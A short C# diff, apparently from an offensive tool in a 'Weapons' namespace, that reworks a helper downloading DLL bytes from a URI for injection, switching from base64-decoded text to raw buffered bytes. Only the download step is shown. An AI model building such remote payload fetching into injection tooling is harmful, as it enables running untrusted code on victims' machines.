@@ -68,29 +68,37 @@ namespace Weapons
         // Get Bytes From Injector DLL target
         public static byte[] GetDLLBytes(string uri)
         {
-            string content = "";
+            byte[] output = null;
+            
             try
             {
+                MemoryStream content = new MemoryStream();
+
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
                 request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
 
                 using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                 using (Stream stream = response.GetResponseStream())
-                using (StreamReader reader = new StreamReader(stream))
                 {
-                    content = reader.ReadToEnd();
+                    int bufferSize = 16384;
+                    byte[] buffer = new byte[bufferSize];
+                    int bytesRead = 0;
+                    
+                    while ((bytesRead = stream.Read(buffer, 0, bufferSize)) != 0)
+                    {
+                        content.Write(buffer, 0, bytesRead);
+                    }
                 }
+
+                output = content.ToArray();
+                content.Close();
             }
             catch
             {
-                // Handling is not necessary
+                return new byte[0];
             }
 
-            if (IsBase64(content))
-            {
-                return Convert.FromBase64String(content);
-            }
-            return new byte[0];
+            return output;
         }
 
         // check if Input string is in base64 format
